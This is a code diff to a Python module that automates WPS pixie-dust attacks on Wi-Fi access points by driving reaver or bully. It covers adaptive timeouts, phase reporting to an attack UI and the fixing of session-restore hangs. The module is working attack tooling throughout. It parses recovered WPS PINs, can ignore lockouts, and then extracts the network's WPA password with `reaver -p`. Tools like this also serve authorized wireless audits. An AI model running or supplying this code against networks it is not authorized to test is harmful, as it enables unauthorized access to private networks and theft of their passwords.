@@ -1,17 +1,13 @@
 # -*- coding: utf-8 -*-
 """WPS pixie-dust attack via reaver (bully fallback).
 
-Unlike the old wifite scraper, this reads only the handful of decisive reaver /
-bully lines — PIN, PSK, and the lock/timeout failures — which are stable across
-tool versions.
+Adaptive timing (visible on the attack UI):
+  BEACON  — soft-bail if no beacon (wrong channel / gone AP)
+  ASSOC   — soft-bail if beacon but no associate/M1/pixie exchange
+  PIXIE   — full WPS Timeout once the exchange is underway
+  GETPSK  — separate PIN→PSK recover (not capped by Rush pixie timeout)
 
-Adaptive timing: soft-bail while still waiting for a beacon (wrong channel /
-gone AP), then honor the full WPS Timeout once a beacon is seen. Immediate kill
-on pixie-fail lines so reaver cannot fall through into hours of PIN brute force.
-
-GETPSK note: after pixie, reaver writes /var/lib/reaver/<BSSID>.wpc. The next
-`reaver -p` then prompts on stdin ("Restore previous session? [n/Y]") and hangs
-forever under Popen with no TTY — that was why GETPSK never recovered a PSK.
+GETPSK: clear reaver .wpc + answer 'n' to session restore so -p does not hang.
 """
 import os
 import re
@@ -26,33 +22,31 @@ from attack import tools
 from attack.model import AttackEvent, EventType
 
 
-# Reaver + bully PIN/PSK lines (pixie and -p recover).
 PIN_RE = re.compile(
     r"(?:WPS PIN|PIN FOUND|Pin is|setting pin to)\s*:?\s*'?([0-9]{4,8})'?",
     re.I)
-# Quoted or bare PSK (some builds omit quotes).
 PSK_RE = re.compile(
     r"(?:WPA PSK|key is)\s*:?\s*'([^']*)'|(?:WPA PSK)\s*:\s*(\S+)",
     re.I)
-# Terminal pixie failures — must kill reaver (else it continues online PIN BF).
 FAIL_RE = re.compile(
     r"pin not found|pixie-?dust.*fail|Pixiewps fail|Pixiewps timeout|"
     r"failed to recover WPA key",
     re.I)
-# During -p recover, only final key failure is terminal (not pixie phrases).
 RECOVER_FAIL_RE = re.compile(r"failed to recover WPA key", re.I)
-# Hard WPS lockout. Rate-limiting waits are non-terminal (reaver sleeps + retries).
 HARD_LOCK_RE = re.compile(
     r"WPS lock(?:out)?|AP (?:is )?locked|WARNING.*(?:WPS )?lock",
     re.I)
 BEACON_RE = re.compile(r"Received beacon from", re.I)
-PROGRESS_RE = re.compile(
-    r"Associated with|Received M[1-7]|Starting Pixie|Pixiewps",
+# Real WPS exchange progress (not mere "Waiting for beacon").
+EXCHANGE_RE = re.compile(
+    r"Associated with|Received M[1-7]|Starting Pixie|Pixiewps:|"
+    r"Trying pin|Sending EAPOL|EAPOL start",
     re.I)
 
 GETPSK_TIMEOUT = 120
-# Soft bail while still waiting for beacon (capped by WPS Timeout).
-BEACON_SOFT_SEC = 12
+# Soft windows (capped by WPS Timeout). Visible as BEACON / ASSOC phases.
+BEACON_SOFT_SEC = 8
+ASSOC_SOFT_SEC = 18
 
 _STDBUF = shutil.which("stdbuf") or (
     "/usr/bin/stdbuf" if os.path.exists("/usr/bin/stdbuf") else None)
@@ -66,7 +60,6 @@ def _psk_from_line(line):
 
 
 def _session_paths(bssid):
-    """Possible reaver session files for this BSSID."""
     raw = (bssid or "").replace(":", "").replace("-", "")
     names = [raw.upper(), raw.lower()]
     paths = []
@@ -78,7 +71,6 @@ def _session_paths(bssid):
 
 
 def _clear_session(bssid):
-    """Remove stale session so reaver won't block on Restore [n/Y] prompt."""
     for path in _session_paths(bssid):
         try:
             os.remove(path)
@@ -106,18 +98,15 @@ def _stop_proc(proc):
 
 
 def _spawn(cmd, clear_bssid=None):
-    """Start reaver/bully with line-buffered stdout and stdin answering 'n'
-    to any session-restore prompt."""
     if clear_bssid:
         _clear_session(clear_bssid)
     real = list(cmd)
-    if _STDBUF and real and "bully" not in real[0]:
+    if _STDBUF and real and "bully" not in os.path.basename(real[0]):
         real = [_STDBUF, "-oL", "-eL"] + real
     tools.log("wps spawn: %s" % " ".join(real))
     proc = subprocess.Popen(
         real, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
         stderr=subprocess.STDOUT, bufsize=1, text=True)
-    # Decline session restore if reaver still asks (belt-and-suspenders).
     try:
         if proc.stdin:
             proc.stdin.write("n\n")
@@ -128,10 +117,14 @@ def _spawn(cmd, clear_bssid=None):
 
 
 def _drain_psk(proc):
-    """Read any remaining stdout after the process ends for a late PSK line."""
+    """Non-blocking-ish drain after the process has been stopped."""
     if not proc or not proc.stdout:
         return None
     try:
+        # Process should already be dead; use a short select so we never hang.
+        ready, _, _ = select.select([proc.stdout.fileno()], [], [], 0.3)
+        if not ready:
+            return None
         rest = proc.stdout.read() or ""
     except Exception:  # noqa: BLE001
         return None
@@ -155,7 +148,6 @@ def _build_cmd(tool, mon, target, ignore_locks):
             cmd.append("-L")
         cmd.append(mon)
         return cmd
-    # reaver: -K 1 = pixie-dust, -N no-nacks, -vv verbose
     cmd = [tools.REAVER, "-i", mon, "-b", bssid, "-K", "1", "-N", "-vv"]
     if channel:
         cmd += ["-c", channel]
@@ -174,7 +166,8 @@ def pixie(mon, target, req, emit, stop_flag):
     tool = config.opt_state(req.attack_modes, "WPS Tool", "reaver")
     ignore_locks = config.opt_bool(req.attack_modes, "Ignore Locks", False)
     timeout = config.opt_int(req.timing, "WPS Timeout", 180)
-    soft_bail = min(BEACON_SOFT_SEC, timeout)
+    beacon_soft = min(BEACON_SOFT_SEC, max(3, timeout // 3))
+    assoc_soft = min(ASSOC_SOFT_SEC, max(beacon_soft + 5, timeout - 5))
 
     bin_path = tools.BULLY if tool == "bully" else tools.REAVER
     if not tools.tool_ok(bin_path):
@@ -184,9 +177,9 @@ def pixie(mon, target, req, emit, stop_flag):
 
     iface_mod.lock_channel(mon, target.get("channel"))
     cmd = _build_cmd(tool, mon, target, ignore_locks)
-    tools.log("wps pixie: timeout=%ss soft_beacon=%ss" % (timeout, soft_bail))
+    tools.log("wps pixie: timeout=%ss beacon_soft=%ss assoc_soft=%ss" % (
+        timeout, beacon_soft, assoc_soft))
     try:
-        # Fresh session so we never block on Restore prompt mid-pixie either.
         proc = _spawn(cmd, clear_bssid=bssid)
     except Exception as e:  # noqa: BLE001
         emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
@@ -197,6 +190,7 @@ def pixie(mon, target, req, emit, stop_flag):
     pin = None
     psk = None
     saw_beacon = False
+    saw_exchange = False
     result = {"ok": False, "essid": essid, "bssid": bssid}
     fd = proc.stdout.fileno()
     try:
@@ -209,18 +203,39 @@ def pixie(mon, target, req, emit, stop_flag):
                 emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                  detail="timeout"))
                 break
-            # Reaver blocks forever waiting for a beacon — bail if none yet.
-            if not saw_beacon and elapsed > soft_bail:
-                tools.log("wps: no beacon within %ss for %s" % (soft_bail, bssid))
+
+            # Soft timeouts — only before real exchange starts.
+            if not saw_beacon and elapsed > beacon_soft:
+                tools.log("wps SOFT: no beacon %ss %s" % (beacon_soft, bssid))
                 emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                  detail="no beacon"))
                 break
+            if saw_beacon and not saw_exchange and elapsed > assoc_soft:
+                tools.log("wps SOFT: no assoc/exchange %ss %s" % (
+                    assoc_soft, bssid))
+                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
+                                 detail="no assoc"))
+                break
+
+            # Visible phase: BEACON → ASSOC → PIXIE
+            if not saw_beacon:
+                phase, left, mx = ("BEACON",
+                                   max(0, int(beacon_soft - elapsed)),
+                                   beacon_soft)
+            elif not saw_exchange:
+                phase, left, mx = ("ASSOC",
+                                   max(0, int(assoc_soft - elapsed)),
+                                   assoc_soft)
+            else:
+                phase, left, mx = ("PIXIE",
+                                   max(0, int(timeout - elapsed)),
+                                   timeout)
+
             ready, _, _ = select.select([fd], [], [], 0.5)
             if not ready:
                 emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
-                                 phase="PIXIE",
-                                 countdown=max(0, int(timeout - elapsed)),
-                                 cd_max=timeout, signal=target.get("signal")))
+                                 phase=phase, countdown=left, cd_max=mx,
+                                 signal=target.get("signal")))
                 continue
             line = proc.stdout.readline()
             if not line:
@@ -232,56 +247,59 @@ def pixie(mon, target, req, emit, stop_flag):
 
             if BEACON_RE.search(line):
                 if not saw_beacon:
-                    tools.log("wps: beacon seen for %s — full timeout %ss" % (
-                        bssid, timeout))
+                    tools.log("wps: beacon OK %s" % bssid)
                 saw_beacon = True
-            elif PROGRESS_RE.search(line):
-                saw_beacon = True  # associate/M1 implies beacon already happened
+            if EXCHANGE_RE.search(line):
+                if not saw_exchange:
+                    tools.log("wps: exchange started %s" % bssid)
+                saw_beacon = True
+                saw_exchange = True
 
             m = PIN_RE.search(line)
             if m:
                 pin = m.group(1)
+                saw_exchange = True
             got = _psk_from_line(line)
             if got is not None:
                 psk = got
-            # Full success = we have the PSK. A pixie-recovered PIN alone ends the
-            # loop too, but the PSK is fetched afterwards from the PIN.
+                saw_exchange = True
             if psk is not None:
                 break
+            # Pixie success line (PIN found) — stop before online PIN BF.
             if pin and re.search(r"pixie", line, re.I) and "PIN" in line.upper():
-                break
+                if not FAIL_RE.search(line):
+                    break
             if HARD_LOCK_RE.search(line) and not ignore_locks:
                 emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                  detail="wps lock"))
                 break
             if FAIL_RE.search(line):
-                # Kill immediately — reaver otherwise continues online PIN BF.
                 emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                  detail="no pin"))
                 break
             emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
-                             phase="PIXIE",
-                             countdown=max(0, int(timeout - (time.time() - start))),
-                             cd_max=timeout, signal=target.get("signal")))
+                             phase=phase,
+                             countdown=max(0, int(
+                                 (timeout if saw_exchange else
+                                  (assoc_soft if saw_beacon else beacon_soft))
+                                 - (time.time() - start))),
+                             cd_max=(timeout if saw_exchange else
+                                     (assoc_soft if saw_beacon else beacon_soft)),
+                             signal=target.get("signal")))
     finally:
         _stop_proc(proc)
 
-    # Got a PIN but not the PSK (pixie quits after PIN). Recover WPA PSK via -p.
-    # GETPSK is not capped by the short Rush pixie timeout.
     if pin and psk is None and not (stop_flag and stop_flag.is_set()):
-        # Let the AP settle after the pixie exchange before -p registration.
         time.sleep(1.5)
         emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                          phase="GETPSK", countdown=GETPSK_TIMEOUT,
                          cd_max=GETPSK_TIMEOUT,
                          signal=target.get("signal")))
-        # Always ignore locks on post-pixie recover — APs often rate-limit.
         psk = _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag,
                            tool=tool, ignore_locks=True,
                            timeout=GETPSK_TIMEOUT)
 
     if psk is not None or pin:
-        # PSK = the Wi-Fi password (connectable). PIN alone = not connectable yet.
         emit(AttackEvent(EventType.CRACKED, essid=essid, bssid=bssid,
                          credential=psk, pin=pin))
         result = {"ok": True, "psk": psk, "pin": pin,
@@ -290,11 +308,6 @@ def pixie(mon, target, req, emit, stop_flag):
 
 
 def recover_psk(iface, target, pin, emit, stop_flag=None, timeout=GETPSK_TIMEOUT):
-    """Standalone PIN -> PSK recovery, driven from the UI (cracked detail view).
-
-    Enables monitor mode on the external adapter, runs `reaver -p <pin>`, then
-    restores the interface. Returns the PSK string, or None on failure/cancel.
-    """
     essid = target.get("essid") or target.get("bssid")
     bssid = target.get("bssid")
     name = iface_mod.iface_name(iface)
@@ -318,10 +331,6 @@ def recover_psk(iface, target, pin, emit, stop_flag=None, timeout=GETPSK_TIMEOUT
 
 def _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag,
                  timeout=GETPSK_TIMEOUT, tool="reaver", ignore_locks=False):
-    """Recover the WPA PSK from a known WPS PIN: `-p <pin>` does one WPS
-    registration and prints the PSK. Uses whichever tool found the PIN (reaver
-    or bully) — a pixie run with one shouldn't silently fail to fetch the PSK
-    just because the other isn't installed. Returns the PSK string or None."""
     bin_path = tools.BULLY if tool == "bully" else tools.REAVER
     if not tools.tool_ok(bin_path):
         emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
@@ -336,15 +345,13 @@ def _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag,
             cmd.append("-L")
         cmd.append(mon)
     else:
-        # -N matches pixie; -L after pixie avoids lockout abort.
-        cmd = [tools.REAVER, "-i", mon, "-b", bssid, "-p", str(pin),
-               "-N", "-vv"]
+        # No -N on recover — some APs need NACKs to finish M7/PSK.
+        cmd = [tools.REAVER, "-i", mon, "-b", bssid, "-p", str(pin), "-vv"]
         if target.get("channel"):
             cmd += ["-c", str(target["channel"])]
         if ignore_locks:
             cmd.append("-L")
     try:
-        # MUST clear .wpc — otherwise reaver blocks on Restore session prompt.
         proc = _spawn(cmd, clear_bssid=bssid)
     except Exception:  # noqa: BLE001
         return None
@@ -374,7 +381,6 @@ def _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag,
             if got is not None:
                 psk = got
                 break
-            # Rate limiting: reaver waits and retries — keep listening.
             if re.search(r"rate limiting", line, re.I):
                 continue
             if HARD_LOCK_RE.search(line) and not ignore_locks:
@@ -386,11 +392,12 @@ def _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag,
         else:
             fail_detail = fail_detail or "timeout"
     finally:
+        # Stop first — never block forever on stdout.read() while reaver lives.
+        _stop_proc(proc)
         if psk is None:
             drained = _drain_psk(proc)
             if drained is not None:
                 psk = drained
-        _stop_proc(proc)
     if psk is None and fail_detail and not (stop_flag and stop_flag.is_set()):
         emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                          detail=fail_detail))
